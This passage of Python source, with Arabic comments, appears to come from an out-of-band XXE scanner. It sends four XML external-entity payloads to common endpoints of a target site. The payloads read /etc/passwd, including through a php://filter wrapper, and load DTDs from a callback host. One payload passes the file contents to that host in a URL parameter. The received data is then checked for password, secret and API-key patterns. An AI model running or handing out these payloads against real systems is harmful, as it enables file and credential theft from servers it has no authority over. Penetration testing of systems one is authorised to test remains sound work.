# انتظر استقبال البيانات
        self.logger.info("⏳ انتظار OOB callbacks لمدة 60 ثانية...")
        time.sleep(self.timeout)
        
        # تحليل النتائج
        self._analyze_oob_results()
        
        # إيقاف الخادم
        self.oob_server.stop()
        
        return self.vulnerabilities
    
    
    def _discover_xml_endpoints(self) -> List[str]:
        """
        اكتشاف XML endpoints
        """
        endpoints = [self.target]
        
        common_paths = [
            '/api/xml', '/xml', '/soap', '/services',
            '/upload', '/import', '/parse', '/rss'
        ]
        
        for path in common_paths:
            url = urljoin(self.target, path)
            endpoints.append(url)
        
        return endpoints
    
    
    def _test_oob_xxe(self, url: str):
        """
        اختبار Out-of-Band XXE على endpoint
        """
        self.logger.info(f"🎯 اختبار OOB XXE: {url}")
        
        # توليد معرف فريد لهذا الاختبار
        test_id = f"test_{int(time.time())}"
        
        # Payload 1: HTTP-based OOB
        payload1 = self._generate_http_oob_payload(test_id)
        self._send_payload(url, payload1, test_id, 'HTTP OOB')
        
        # Payload 2: FTP-based OOB
        payload2 = self._generate_ftp_oob_payload(test_id)
        self._send_payload(url, payload2, test_id, 'FTP OOB')
        
        # Payload 3: DTD-based OOB
        payload3 = self._generate_dtd_oob_payload(test_id)
        self._send_payload(url, payload3, test_id, 'DTD OOB')
        
        # Payload 4: Parameter Entity OOB
        payload4 = self._generate_parameter_entity_oob_payload(test_id)
        self._send_payload(url, payload4, test_id, 'Parameter Entity OOB')
    
    
    def _generate_http_oob_payload(self, test_id: str) -> str:
        """
        توليد HTTP OOB payload
        """
        callback_url = f"http://{self.oob_host}:{self.oob_port}/{test_id}"
        
        payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "{callback_url}/evil.dtd">
%dtd;
]>
<foo>&send;</foo>'''
        
        return payload
    
    
    def _generate_ftp_oob_payload(self, test_id: str) -> str:
        """
        توليد FTP OOB payload
        """
        # في بيئة حقيقية، ستحتاج FTP server
        ftp_url = f"ftp://{self.oob_host}:21/{test_id}"
        
        payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "{ftp_url}/evil.dtd">
%dtd;
]>
<foo>test</foo>'''
        
        return payload
    
    
    def _generate_dtd_oob_payload(self, test_id: str) -> str:
        """
        توليد DTD-based OOB payload
        """
        dtd_url = f"http://{self.oob_host}:{self.oob_port}/evil.dtd?id={test_id}"
        
        payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '{dtd_url}?data=%file;'>">
%eval;
%exfil;
]>
<foo>test</foo>'''
        
        return payload
    
    
    def _generate_parameter_entity_oob_payload(self, test_id: str) -> str:
        """
        توليد Parameter Entity OOB payload
        """
        callback_url = f"http://{self.oob_host}:{self.oob_port}/{test_id}"
        
        payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % dtd SYSTEM "{callback_url}/param.dtd">
%dtd;
%send;
]>
<foo>test</foo>'''
        
        return payload
    
    
    def _send_payload(self, url: str, payload: str, test_id: str, payload_type: str):
        """
        إرسال OOB payload
        """
        try:
            self.logger.info(f"  📤 إرسال {payload_type}...")
            
            response = self.http.send_request(
                url=url,
                method='POST',
                data=payload,
                headers={
                    'Content-Type': 'application/xml',
                    'X-Test-ID': test_id
                },
                timeout=30
            )
            
            self.logger.info(f"  📥 Response Status: {response.status_code}")
            
        except Exception as e:
            self.logger.warning(f"  ⚠️ خطأ: {str(e)}")
    
    
    def _analyze_oob_results(self):
        """
        تحليل البيانات المستقبلة من OOB
        """
        received_data = self.oob_server.get_received_data()
        
        self.logger.info("\n" + "="*60)
        self.logger.info("📊 تحليل نتائج OOB")
        self.logger.info("="*60)
        
        if not received_data:
            self.logger.info("❌ لم يتم استقبال أي بيانات OOB")
            return
        
        self.logger.success(f"✅ تم استقبال {len(received_data)} callback!")
        
        for i, callback in enumerate(received_data, 1):
            self.logger.info(f"\n📡 Callback #{i}:")
            self.logger.info(f"   الوقت: {time.ctime(callback['timestamp'])}")
            self.logger.info(f"   العنوان: {callback['address']}")
            self.logger.info(f"   البيانات: {callback['data'][:200]}...")
            
            # تحقق من محتوى حساس
            if self._contains_sensitive_data(callback['data']):
                self._report_vulnerability(
                    callback_data=callback,
                    severity='critical'
                )
    
    
    def _contains_sensitive_data(self, data: str) -> bool:
        """
        التحقق من وجود بيانات حساسة في OOB callback
        """
        sensitive_patterns = [
            r'root:x:0:0:',
            r'/bin/bash',
            r'/home/',
            r'daemon:',
            r'password',
            r'secret',
            r'api[_-]?key',
        ]
        
        import re
        for pattern in sensitive_patterns:
            if re.search(pattern, data, re.IGNORECASE):
                return True
        
        return False
    
    
    def _report_vulnerability(self, **kwargs):
        """
        تسجيل ثغرة OOB XXE
        """
        vuln = {
            'timestamp': time.time(),
            'scanner': 'XXE Out-of-Band Scanner',
            'vuln_type': 'XXE - Out-of-Band',
            'confidence': 98,
            'cvss_score': 9.5,
            'cwe': 'CWE-611',
            'description': 'Out-of-Band XXE vulnerability allows data exfiltration',
            **kwargs
        }
        
        self.vulnerabilities.append(vuln)
        self.logger.success("🔴 ثغرة OOB XXE مؤكدة!")


# مثال على الاستخدام
if __name__ == "__main__":
    config = {
        'oob_host': '192.168.1.100',  # IP الخاص بك
        'oob_port': 8888,
        'timeout': 60
    }
    
    scanner = XXEOutOfBandScanner("https://example.com", config)
    results = scanner.scan()
    
    print(f"\n\nتم اكتشاف {len(results)} ثغرة OOB XXE")